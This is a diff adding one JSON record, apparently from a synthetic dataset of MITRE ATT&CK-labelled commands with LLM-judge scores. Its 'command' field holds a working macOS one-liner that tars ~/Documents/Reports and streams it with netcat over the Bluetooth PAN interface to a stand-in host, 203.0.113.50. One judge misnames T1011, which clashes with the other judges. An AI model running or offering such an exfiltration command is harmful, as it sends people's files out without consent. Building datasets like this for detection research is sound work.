@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar czf - ~/Documents/Reports | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.50 55812",
+  "explanation": "Exfiltrates a compressed archive over the Bluetooth PAN interface by binding netcat to that service's IP, aligning with T1011 (use of an alternate network medium).",
+  "rationale_steps": [
+    "Query Bluetooth PAN IP via networksetup",
+    "Bind netcat to the Bluetooth PAN address (distinct medium)",
+    "Stream compressed data to a high, uncommon TCP port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-e814cd6b",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper piping, balanced quotes, valid flags for both tar and netcat, and correct use of command substitution.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements exfiltration over an alternate network medium (Bluetooth PAN) as claimed, but the technique ID should be T1048.001 (Exfiltration Over Alternative Protocol) rather than T1011.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T09:38:16.892596Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, and correct command chaining for Bash on macOS.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is operationally plausible for data exfiltration, it fundamentally misaligns with MITRE ATT&CK T1011 'Establish Accounts,' which is unrelated to data movement.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T09:38:31.368325Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed pipeline with valid options and properly balanced quoting and command substitution.",
+        "semantic_score": 4,
+        "semantic_justification": "It streams a gzip tar archive via netcat bound to the Bluetooth PAN IP, plausibly achieving exfiltration over an alternate network medium, but success depends on the interface being active/routable and the destination IP being reachable.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T09:39:10.572502Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
